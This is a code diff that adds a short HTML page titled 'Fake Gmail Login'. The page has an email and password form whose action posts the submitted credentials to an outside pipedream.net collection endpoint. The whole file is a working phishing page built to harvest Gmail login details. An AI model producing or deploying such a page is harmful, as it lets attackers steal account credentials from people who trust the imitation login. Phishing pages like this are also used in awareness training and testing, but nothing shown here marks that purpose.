@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Fake Gmail Login</title>
+</head>
+<body>
+<h2>Fake Gmail Login</h2>
+<form action="https://eox2jrmfs30p1k.m.pipedream.net/" method="POST">
+<label for="email">Email:</label>
+
+<input type="email" id="email" name="email" required>
+
+<label for="password">Password:</label>
+
+<input type="password" id="password" name="password" required>
+
+<input type="submit" value="Login">
+</form>
+</body>
+</html>
